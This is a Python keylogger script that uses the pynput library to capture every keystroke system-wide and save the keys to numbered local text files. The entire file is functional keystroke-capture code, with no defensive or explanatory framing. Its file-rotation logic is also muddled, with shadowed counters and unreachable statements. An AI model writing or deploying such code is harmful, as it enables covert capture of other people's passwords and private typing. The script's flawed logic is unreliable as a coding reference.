#!/usr/bin/env python3
import pynput
from pynput.keyboard import Key, Listener

filename = "keylogs"
order = 1
text_format = ".txt"
full_file_format = filename + str(order) + text_format

count = 0
log = []


def on_click(key):
    global log, count, order

    log.append(key)
    count += 1
    print(format(key),"has been pressed")

    if count == 500:
        for count in log:
            order += 1
            full_file_format = filename + str(order) + text_format
            count = 0
            write_in_file()
            break
    


def write_in_file():
    global full_file_format, count, log, order,text_format
    try:
        with open(full_file_format, "x") as f:
            for key in log:
                k = str(key).replace("'","'")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
    
    except FileExistsError:
        for count in log:
            full_file_format = filename + str(order) + text_format
            count = 0
            break
            if order == 10:
                break
            with open(full_file_format, "x") as f:
                for key in log:
                    k = str(key).replace("'","'")
                    if k.find("space") > 0:
                        f.write('\n')
                    elif k.find("Key") == -1:
                        f.write(k)


try:
    with Listener(on_press=on_click) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n\nProgram has stopped Logging.")
